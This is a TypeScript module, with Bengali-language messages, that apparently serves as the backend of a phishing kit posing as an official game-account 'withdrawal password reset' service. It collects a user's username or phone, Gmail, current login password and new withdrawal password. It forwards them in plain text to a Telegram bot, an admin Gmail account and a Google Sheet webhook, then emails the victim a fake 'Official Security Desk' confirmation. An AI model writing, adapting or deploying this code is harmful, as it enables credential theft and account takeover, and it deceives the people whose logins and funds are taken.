import nodemailer from "nodemailer";

export function escapeTelegramHtml(text: any): string {
  if (text === undefined || text === null) return "";
  return String(text)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

export function cleanString(val?: string | null): string {
  if (!val) return "";
  return val.trim().replace(/^['"]|['"]$/g, "");
}

export function getTelegramConfig() {
  let botToken = cleanString(process.env.TELEGRAM_BOT_TOKEN);
  if (botToken.startsWith("bot")) {
    botToken = botToken.slice(3);
  }
  const chatId = cleanString(process.env.TELEGRAM_CHAT_ID);
  return { botToken, chatId, isConfigured: Boolean(botToken && chatId) };
}

export function getEmailConfig() {
  const adminEmail = cleanString(
    process.env.ADMIN_GMAIL || process.env.GMAIL_USER || "sflove087@gmail.com"
  );
  // Remove spaces often copied from Google 4-character grouped app passwords (e.g. "abcd efgh ijkl mnop")
  const appPassword = cleanString(
    process.env.GMAIL_APP_PASSWORD ||
    process.env.ADMIN_GMAIL_APP_PASSWORD ||
    process.env.BUSINESS_EMAIL_PASS ||
    process.env.SMTP_PASS
  ).replace(/\s+/g, "");

  const companyName = cleanString(
    process.env.COMPANY_NAME || process.env.BUSINESS_EMAIL_FROM_NAME
  );

  return {
    adminEmail,
    appPassword,
    companyName,
    isConfigured: Boolean(adminEmail && appPassword),
  };
}

export function getGoogleSheetConfig() {
  const webhookUrl = cleanString(
    process.env.GOOGLE_SHEET_WEBHOOK_URL ||
    process.env.GOOGLE_SHEETS_WEBHOOK_URL ||
    process.env.GOOGLE_SHEET_URL ||
    process.env.GOOGLE_APPS_SCRIPT_URL
  );
  return {
    webhookUrl,
    isConfigured: Boolean(webhookUrl && webhookUrl.startsWith("http")),
    maskedUrl: webhookUrl ? `${webhookUrl.slice(0, 30)}...` : null,
  };
}

export function checkConfigStatus() {
  const tg = getTelegramConfig();
  const mail = getEmailConfig();
  const sheet = getGoogleSheetConfig();
  return {
    telegram: {
      isConfigured: tg.isConfigured,
      botTokenSet: Boolean(tg.botToken),
      botTokenMasked: tg.botToken ? `${tg.botToken.slice(0, 5)}...${tg.botToken.slice(-4)}` : null,
      chatIdSet: Boolean(tg.chatId),
      chatIdMasked: tg.chatId ? `${tg.chatId.slice(0, 3)}***` : null,
    },
    email: {
      isConfigured: mail.isConfigured,
      adminEmail: mail.adminEmail,
      appPasswordSet: Boolean(mail.appPassword),
      companyName: mail.companyName || "Default Desk",
    },
    googleSheet: {
      isConfigured: sheet.isConfigured,
      webhookUrlSet: Boolean(sheet.webhookUrl),
      maskedUrl: sheet.maskedUrl,
    },
    environment: process.env.VERCEL ? "vercel" : "node-container",
  };
}

export interface ResetNotificationPayload {
  gameName: string;
  requestId: string;
  usernameOrPhone: string;
  gmail?: string;
  loginPassword?: string;
  newWithdrawPassword: string;
  timestamp?: string;
  companyName?: string;
}

export async function sendTelegramNotification(
  payload: ResetNotificationPayload
): Promise<{ sent: boolean; configured: boolean; error?: string; telegramResponse?: any }> {
  const { botToken, chatId, isConfigured } = getTelegramConfig();

  if (!isConfigured) {
    return {
      sent: false,
      configured: false,
      error: "TELEGRAM_BOT_TOKEN অথবা TELEGRAM_CHAT_ID এনভায়রনমেন্ট ভ্যারিয়েবলে কনফিগার করা নেই। Vercel Settings > Environment Variables-এ যোগ করুন।",
    };
  }

  const effectiveCompanyName = payload.companyName || payload.gameName;

  const messageLines = [
    `🔔 <b>নতুন পাসওয়ার্ড রিসেট আবেদন</b>`,
    `━━━━━━━━━━━━━━━━━━━`,
    `🏢 <b>কোম্পানি:</b> ${escapeTelegramHtml(effectiveCompanyName)}`,
    `🎮 <b>গেমের নাম:</b> ${escapeTelegramHtml(payload.gameName)}`,
    `🆔 <b>ট্র্যাকিং আইডি:</b> <code>${escapeTelegramHtml(payload.requestId)}</code>`,
    `👤 <b>ইউজার/ফোন:</b> <code>${escapeTelegramHtml(payload.usernameOrPhone)}</code>`,
    `📧 <b>গ্রাহকের জিমেইল:</b> ${escapeTelegramHtml(payload.gmail || "দেওয়া হয়নি")}`,
    `🔑 <b>বর্তমান লগইন পাসওয়ার্ড:</b> <code>${escapeTelegramHtml(payload.loginPassword || "গোপন")}</code>`,
    `💰 <b>নতুন উত্তোলন পাসওয়ার্ড:</b> <code>${escapeTelegramHtml(payload.newWithdrawPassword)}</code>`,
    `⏰ <b>সময়:</b> ${escapeTelegramHtml(payload.timestamp || new Date().toLocaleString("bn-BD"))}`,
    `━━━━━━━━━━━━━━━━━━━`,
    `🛡️ <i>অফিসিয়াল সিকিউর রিসেট প্রোটোকল</i>`,
  ];

  const text = messageLines.join("\n");

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: "HTML",
      }),
    });

    const data = (await response.json()) as any;
    if (!response.ok || !data.ok) {
      console.error("Telegram API Error:", data);
      return {
        sent: false,
        configured: true,
        error: data.description || "Failed to send message via Telegram",
        telegramResponse: data,
      };
    }

    return { sent: true, configured: true, telegramResponse: data };
  } catch (error: any) {
    console.error("Telegram request failed:", error);
    return {
      sent: false,
      configured: true,
      error: error.message || "Network error sending to Telegram",
    };
  }
}

export async function sendEmailNotification(
  payload: ResetNotificationPayload
): Promise<{
  sent: boolean;
  recipient?: string;
  sender?: string;
  companyName?: string;
  isLiveConfigured?: boolean;
  error?: string;
}> {
  const { adminEmail, appPassword, companyName: defaultCompany, isConfigured } = getEmailConfig();

  const userRecipientEmail = cleanString(payload.gmail);
  const effectiveCompanyName = cleanString(
    defaultCompany ||
    payload.companyName ||
    (payload.gameName ? `${payload.gameName} Official Security Desk` : "Official Reset Support Desk")
  );

  if (!isConfigured) {
    return {
      sent: false,
      recipient: userRecipientEmail || adminEmail,
      sender: effectiveCompanyName,
      companyName: effectiveCompanyName,
      isLiveConfigured: false,
      error: "GMAIL_APP_PASSWORD কনফিগার করা নেই। Vercel Settings > Environment Variables-এ ১৬ সংখ্যার Google App Password যোগ করুন।",
    };
  }

  try {
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: adminEmail,
        pass: appPassword,
      },
    });

    const fromAddress = `"${effectiveCompanyName}" <${adminEmail}>`;

    // 1. Send confirmation to user if Gmail is provided
    if (userRecipientEmail && userRecipientEmail.includes("@")) {
      const userMailOptions = {
        from: fromAddress,
        to: userRecipientEmail,
        subject: `[নিশ্চিতকরণ] ${effectiveCompanyName} - ${payload.gameName} উত্তোলন পাসওয়ার্ড রিসেট আবেদন গৃহীত হয়েছে (ID: ${payload.requestId})`,
        html: `
          <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 24px; border: 1px solid #e2e8f0; border-radius: 12px; background-color: #ffffff;">
            <div style="background: linear-gradient(135deg, #1d4ed8, #4338ca); color: #ffffff; padding: 20px; border-radius: 8px; text-align: center;">
              <h2 style="margin: 0; font-size: 20px;">উত্তোলন পাসওয়ার্ড রিসেট আবেদন গৃহীত হয়েছে</h2>
              <p style="margin: 6px 0 0 0; font-size: 13px; opacity: 0.9;">${effectiveCompanyName} থেকে পাঠানো বার্তা</p>
            </div>
            
            <div style="padding: 20px 6px;">
              <p style="color: #334155; font-size: 15px; line-height: 1.6;">
                প্রিয় গ্রাহক,<br />
                <strong>${effectiveCompanyName}</strong>-এ আপনার <strong>${payload.gameName}</strong> অ্যাকাউন্টের টাকা তোলার পাসওয়ার্ড (Withdrawal Password) রিসেটের আবেদনটি সফলভাবে সিস্টেমে গ্রহণ করা হয়েছে।
              </p>

              <div style="background-color: #f8fafc; border: 1px solid #cbd5e1; border-radius: 8px; padding: 18px; margin: 18px 0;">
                <table style="width: 100%; font-size: 14px; border-collapse: collapse;">
                  <tr>
                    <td style="padding: 8px 0; color: #64748b; font-weight: bold; width: 40%;">কোম্পানি / সার্ভিস:</td>
                    <td style="padding: 8px 0; font-weight: bold; color: #1e293b; font-size: 15px;">${effectiveCompanyName}</td>
                  </tr>
                  <tr>
                    <td style="padding: 8px 0; color: #64748b; font-weight: bold;">ট্র্যাকিং আইডি:</td>
                    <td style="padding: 8px 0; font-weight: bold; color: #2563eb; font-family: monospace; font-size: 15px;">${payload.requestId}</td>
                  </tr>
                  <tr>
                    <td style="padding: 8px 0; color: #64748b; font-weight: bold;">গেমের নাম:</td>
                    <td style="padding: 8px 0; font-weight: bold; color: #1e293b;">${payload.gameName}</td>
                  </tr>
                  <tr>
                    <td style="padding: 8px 0; color: #64748b; font-weight: bold;">ইউজার নেম / ফোন:</td>
                    <td style="padding: 8px 0; font-weight: bold; color: #1e293b;">${payload.usernameOrPhone}</td>
                  </tr>
                  <tr>
                    <td style="padding: 8px 0; color: #64748b; font-weight: bold;">গ্রাহকের জিমেইল:</td>
                    <td style="padding: 8px 0; font-weight: bold; color: #1e293b;">${userRecipientEmail}</td>
                  </tr>
                  <tr>
                    <td style="padding: 8px 0; color: #64748b; font-weight: bold;">আবেদনের সময়:</td>
                    <td style="padding: 8px 0; font-weight: bold; color: #1e293b;">${payload.timestamp || new Date().toLocaleString("bn-BD")}</td>
                  </tr>
                  <tr>
                    <td style="padding: 8px 0; color: #64748b; font-weight: bold;">বর্তমান অবস্থা:</td>
                    <td style="padding: 8px 0; font-weight: bold; color: #0284c7;">ইন-রিভিউ (৫-১৫ মিনিটের মধ্যে কার্যকর হবে)</td>
                  </tr>
                </table>
              </div>

              <p style="color: #64748b; font-size: 13px; line-height: 1.5;">
                🔒 আপনার নিরাপত্তা নিশ্চিত করতে নতুন পাসওয়ার্ডটি কাউকে জানাবেন না। ${effectiveCompanyName} ভেরিফিকেশন প্যানেল থেকে পর্যালোচনা শেষে আপনার উত্তোলন সুবিধা চালু হবে।
              </p>
            </div>

            <div style="border-top: 1px solid #e2e8f0; padding-top: 14px; text-align: center; color: #94a3b8; font-size: 12px;">
              প্রেরক: ${effectiveCompanyName} • অফিসিয়াল সিকিউর রিসেট প্রোটোকল
            </div>
          </div>
        `,
      };

      await transporter.sendMail(userMailOptions);
    }

    // 2. Also send full notification record to ADMIN
    const adminMailOptions = {
      from: fromAddress,
      to: adminEmail,
      subject: `🚨 [নতুন আবেদন] ${payload.gameName} - ইউজার: ${payload.usernameOrPhone} (ID: ${payload.requestId})`,
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 24px; border: 1px solid #e2e8f0; border-radius: 12px; background-color: #ffffff;">
          <div style="background: #1e293b; color: #ffffff; padding: 18px; border-radius: 8px; text-align: center;">
            <h2 style="margin: 0; font-size: 18px;">অ্যাডমিন নোটিফিকেশন: নতুন পাসওয়ার্ড রিসেট আবেদন</h2>
          </div>
          <div style="padding: 18px 0;">
            <table style="width: 100%; font-size: 14px; border-collapse: collapse;">
              <tr><td style="padding: 6px 0; color: #64748b;">ট্র্যাকিং আইডি:</td><td style="padding: 6px 0; font-weight: bold;">${payload.requestId}</td></tr>
              <tr><td style="padding: 6px 0; color: #64748b;">গেমের নাম:</td><td style="padding: 6px 0; font-weight: bold; color: #2563eb;">${payload.gameName}</td></tr>
              <tr><td style="padding: 6px 0; color: #64748b;">গ্রাহকের জিমেইল:</td><td style="padding: 6px 0; font-weight: bold; color: #16a34a;">${userRecipientEmail || "দেওয়া হয়নি"}</td></tr>
              <tr><td style="padding: 6px 0; color: #64748b;">ইউজার/ফোন:</td><td style="padding: 6px 0; font-weight: bold;">${payload.usernameOrPhone}</td></tr>
              <tr style="background:#fef2f2;"><td style="padding: 6px; color: #dc2626; font-weight: bold;">বর্তমান লগইন পাসওয়ার্ড:</td><td style="padding: 6px; font-weight: bold; color: #dc2626; font-family: monospace;">${payload.loginPassword || "গোপন"}</td></tr>
              <tr style="background:#f0fdf4;"><td style="padding: 6px; color: #15803d; font-weight: bold;">নতুন উত্তোলন পাসওয়ার্ড:</td><td style="padding: 6px; font-weight: bold; color: #16a34a; font-family: monospace; font-size: 16px;">${payload.newWithdrawPassword}</td></tr>
              <tr><td style="padding: 6px 0; color: #64748b;">সময়:</td><td style="padding: 6px 0;">${payload.timestamp || new Date().toLocaleString("bn-BD")}</td></tr>
            </table>
          </div>
        </div>
      `,
    };

    await transporter.sendMail(adminMailOptions);

    return {
      sent: true,
      recipient: userRecipientEmail || adminEmail,
      sender: effectiveCompanyName,
      companyName: effectiveCompanyName,
      isLiveConfigured: true,
    };
  } catch (error: any) {
    console.error("Email send error:", error);
    return {
      sent: false,
      recipient: userRecipientEmail || adminEmail,
      sender: effectiveCompanyName,
      companyName: effectiveCompanyName,
      isLiveConfigured: true,
      error: error.message || "Failed to send email via Gmail SMTP",
    };
  }
}

export async function sendToGoogleSheet(
  payload: ResetNotificationPayload
): Promise<{ sent: boolean; configured: boolean; error?: string }> {
  const { webhookUrl, isConfigured } = getGoogleSheetConfig();

  if (!isConfigured) {
    return {
      sent: false,
      configured: false,
      error: "GOOGLE_SHEET_WEBHOOK_URL কনফিগার করা নেই। Vercel Settings > Environment Variables-এ Google Apps Script Web App URL যোগ করুন।",
    };
  }

  try {
    const rowData = {
      action: "appendRow",
      requestId: payload.requestId,
      timestamp: payload.timestamp || new Date().toLocaleString("bn-BD"),
      gameName: payload.gameName,
      usernameOrPhone: payload.usernameOrPhone,
      gmail: payload.gmail || "",
      loginPassword: payload.loginPassword || "",
      newWithdrawPassword: payload.newWithdrawPassword,
      companyName: payload.companyName || payload.gameName,
      status: "In Review",
    };

    // Google Apps Script Web App accepts POST and typically redirects (302) to an exec response
    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "text/plain;charset=utf-8",
      },
      body: JSON.stringify(rowData),
      redirect: "follow",
    });

    if (!response.ok && response.status !== 302 && response.status !== 301) {
      return {
        sent: false,
        configured: true,
        error: `Google Sheets Webhook HTTP error: ${response.status}`,
      };
    }

    return {
      sent: true,
      configured: true,
    };
  } catch (error: any) {
    console.error("Google Sheet webhook error:", error);
    return {
      sent: false,
      configured: true,
      error: error.message || "Failed to send data to Google Sheet",
    };
  }
}
